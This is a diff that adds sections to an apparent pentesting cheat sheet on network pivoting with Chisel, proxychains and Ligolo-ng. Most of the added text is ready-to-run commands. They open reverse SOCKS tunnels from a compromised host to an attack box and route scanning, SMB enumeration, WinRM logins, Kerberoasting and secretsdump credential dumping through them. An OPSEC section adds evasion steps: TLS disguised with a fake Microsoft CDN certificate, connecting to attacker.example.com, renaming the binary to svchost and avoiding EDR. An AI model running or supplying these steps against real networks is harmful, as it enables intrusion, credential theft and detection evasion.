@@ -186,6 +186,95 @@ proxychains ./chisel client 172.16.5.19:2345 socks
 # socks5 127.0.0.1 1081
 ```
 
+## Chisel with Authentication
+
+Protect the Chisel server with a shared secret to prevent unauthorized connections to your pivot tunnel.
+
+```
+# ── Attack Box (Chisel SERVER with auth) ──────────────────────
+./chisel server -v -p 1234 --socks5 --auth "user:SecretPass123"
+
+# ── Pivot Host (Chisel CLIENT with auth) ──────────────────────
+./chisel client -v --auth "user:SecretPass123" 10.10.14.5:1234 socks
+
+# Auth with reverse mode:
+./chisel server -v -p 1234 --reverse --auth "pivot:TunnelPass!"
+./chisel client -v --auth "pivot:TunnelPass!" 10.10.14.5:1234 R:socks
+
+# Multiple user credentials (server side) — use a credentials file:
+# Create creds.json:
+# {"user1":"pass1","user2":"pass2"}
+./chisel server -v -p 1234 --socks5 --authfile /tmp/creds.json
+
+# Why use auth:
+# - Prevents other actors from connecting to your Chisel server
+# - Critical if server is bound on 0.0.0.0 (internet-facing)
+```
+
+## Multiple Chisel Tunnels on the Same Server
+
+Run multiple independent tunnels through one Chisel server by using separate listening ports or by having multiple clients connect simultaneously.
+
+```
+# One server, multiple clients connecting on different tunnel definitions:
+# ── Attack Box ────────────────────────────────────────────────
+./chisel server -v -p 1234 --socks5 --reverse
+# This single server handles all clients
+
+# ── Pivot1 (Linux) ────────────────────────────────────────────
+./chisel client -v 10.10.14.5:1234 R:1080:socks
+# Creates SOCKS5 at attack box :1080
+
+# ── Pivot2 (Windows) ──────────────────────────────────────────
+C:\Windows\Temp\chisel.exe client --auth user:pass 10.10.14.5:1234 R:1081:socks
+# Creates SOCKS5 at attack box :1081
+
+# ── Attack Box — configure proxychains per tunnel ─────────────
+# /etc/proxychains4.conf for subnet reached via Pivot1:
+# socks5 127.0.0.1 1080
+
+# Use separate proxychains config files per pivot:
+proxychains -f /etc/proxychains-pivot1.conf nmap -sT 172.16.5.0/24
+proxychains -f /etc/proxychains-pivot2.conf nmap -sT 192.168.10.0/24
+
+# Forward specific ports through named pivots:
+./chisel client 10.10.14.5:1234 R:3389:172.16.5.19:3389 R:5985:172.16.5.19:5985
+```
+
+## Combining Chisel with Proxychains for Tool Routing
+
+Chisel creates the SOCKS5 proxy; proxychains routes tools through it. Here is a practical workflow for a full assessment through a Chisel pivot.
+
+```
+# Step 1: Start Chisel on attack box
+./chisel server -v -p 8080 --socks5
+
+# Step 2: Upload and run Chisel client on pivot
+scp chisel ubuntu@10.129.202.64:/tmp/
+ssh ubuntu@10.129.202.64 "/tmp/chisel client 10.10.14.5:8080 socks &"
+
+# Step 3: Set proxychains to use SOCKS5 on :1080
+# /etc/proxychains4.conf:
+# socks5  127.0.0.1  1080
+
+# Step 4: Reconnaissance
+proxychains nmap -sT -Pn -p 22,80,135,139,443,445,3389,5985 172.16.5.0/24
+
+# Step 5: SMB enumeration
+proxychains crackmapexec smb 172.16.5.0/24 --shares
+
+# Step 6: WinRM access
+proxychains evil-winrm -i 172.16.5.19 -u Administrator -p 'Password123!'
+
+# Step 7: Kerberos attacks (set proxychains + configure KDC routing)
+proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
+    CORP/user:pass@172.16.5.19 -dc-ip 172.16.5.19 -request
+
+# Step 8: Dump credentials via proxychains
+proxychains python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
+    CORP/Administrator:'Password123!'@172.16.5.19
+```
+
 ## Ligolo-ng — TUN Interface Pivoting
 
 Ligolo-ng is a modern pivoting framework that creates a real TUN network interface on your attack box — meaning no proxychains, no SOCKS configuration. All tools work natively as if you're directly connected to the target subnet. It's faster and more reliable than SOCKS-based approaches for most tools.
@@ -259,3 +348,47 @@ sudo ip route add 192.168.1.0/24 dev ligolo2
 # → Full network access, want to run any tool directly: Ligolo-ng
 # → SSH available: ssh -D or sshuttle (simpler)
 ```
+
+## OPSEC: Chisel Traffic Patterns and TLS Wrapping
+
+Chisel's default HTTP transport is detectable. Understanding its traffic signature and applying TLS improves evasion.
+
+```
+# Default Chisel traffic characteristics:
+# - HTTP/1.1 POST requests to the server port
+# - User-Agent header contains "Go-http-client" by default
+# - Websocket upgrade headers (Upgrade: websocket, Connection: Upgrade)
+# - High-frequency requests from the pivot host
+# - Traffic to a non-standard high port (1234, 8080, etc.)
+
+# Enable TLS on the Chisel server (reduces plaintext inspection):
+./chisel server -v -p 443 --socks5 --tls-key /etc/ssl/private/server.key --tls-cert /etc/ssl/certs/server.crt
+
+# Generate a self-signed cert:
+openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes \
+    -subj "/C=US/O=Corp/CN=updates.microsoft-cdn.com"
+
+# Client connects with TLS:
+./chisel client -v --tls-skip-verify https://10.10.14.5:443 socks
+# --tls-skip-verify: accept self-signed cert
+
+# Use port 443 or 80 to blend with expected web traffic
+# Use a hostname instead of IP when possible (requires DNS or /etc/hosts on pivot)
+./chisel client -v https://attacker.example.com:443 socks
+
+# OPSEC checklist for Chisel:
+# - Use TLS (--tls-key/--tls-cert) to prevent plaintext inspection
+# - Use port 443 or 80 rather than custom ports
+# - Use --auth to prevent unauthorized connections
+# - Rename the binary to something innocuous (svchost, update, etc.)
+# - Remove the binary when tunneling is complete
+# - Avoid running on monitored hosts with EDR that flags Go binaries
+```
+
+## Resources
+
+- Chisel — https://github.com/jpillora/chisel
+- Ligolo-ng — https://github.com/nicocha30/ligolo-ng
+- proxychains-ng — https://github.com/rofl0r/proxychains-ng
+- MITRE T1572 — Protocol Tunneling
+- MITRE T1090 — Proxy
